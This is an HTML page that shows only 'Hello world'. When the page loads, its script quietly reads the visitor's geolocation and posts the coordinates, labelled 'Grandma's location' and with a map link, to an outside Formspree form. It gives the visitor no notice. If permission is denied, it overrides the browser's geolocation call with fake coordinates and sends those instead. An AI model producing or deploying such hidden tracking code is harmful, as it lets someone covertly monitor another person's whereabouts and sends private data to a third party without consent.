<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location via Email</title>
    <script>
        // Function to spoof the location (for testing purposes or fallback)
        function spoofLocation(latitude, longitude) {
            // Override geolocation's getCurrentPosition method to return spoofed data
            Object.defineProperty(navigator.geolocation, 'getCurrentPosition', {
                value: (successCallback) => successCallback({
                    coords: { latitude, longitude }
                }),
                writable: true,
            });
        }

        // Function to send the location
        function sendLocation() {
            if ("geolocation" in navigator) {
                // Try to fetch the location immediately
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;

                        // Prepare email data
                        const emailData = new FormData();
                        emailData.append('latitude', latitude);
                        emailData.append('longitude', longitude);
                        emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

                        // Send the email via Formspree API
                        fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
                            method: 'POST',
                            body: emailData
                        })
                        .then(response => response.json())
                        .then(() => console.log('Location sent successfully!'))
                        .catch((error) => {
                            console.error('Error:', error);
                            alert('Failed to send the email.');
                        });
                    },
                    (error) => {
                        // Handle geolocation error (e.g., permission denied)
                        console.error("Error fetching location:", error);
                        alert("Error fetching location: " + error.message);

                        // If permission is denied, spoof location
                        spoofLocation(40.7128, -74.0060);  // Example: New York City coordinates
                        sendLocation();  // Retry sending with spoofed location
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // Automatically check permissions and send location when the page loads
        window.onload = function() {
            sendLocation();
        };
    </script>
</head>
<body>
    <h1>Hello world</h1>
</body>
</html>
